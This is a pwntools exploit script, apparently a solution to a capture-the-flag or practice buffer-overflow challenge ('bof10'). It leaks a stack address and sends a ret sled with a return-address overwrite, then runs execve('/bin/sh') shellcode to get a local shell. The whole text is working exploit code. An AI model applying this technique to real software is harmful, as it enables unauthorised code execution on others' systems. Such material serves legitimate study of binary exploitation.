script:

```
from pwn import *

p = process('./bof10')
exe = ELF(b'./bof10')

gdb.attach(p,gdbscript = '''
b*main+196
b*play_game+99

c
''')

input()

p.sendlineafter(b'name: ', b'A'*8)
p.recvuntil(b'I have a gift for you: ')
stack_leak = int(p.recvline()[:-1], 16)
log.info("Stack leak: " + hex(stack_leak))

shellcode = asm(
    '''
    mov rbx, 29400045130965551
    push rbx

    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall
    ''', arch = 'amd64'
)

ret = 0x0000000000401357

payload = p64(ret) * 0x30
# payload += p64(0xdeadbeef)
payload += p64(stack_leak - 0x88)
payload += shellcode
payload = payload.ljust(512, b'A')

p.sendlineafter(b'Say something: ', payload)

p.interactive()
```
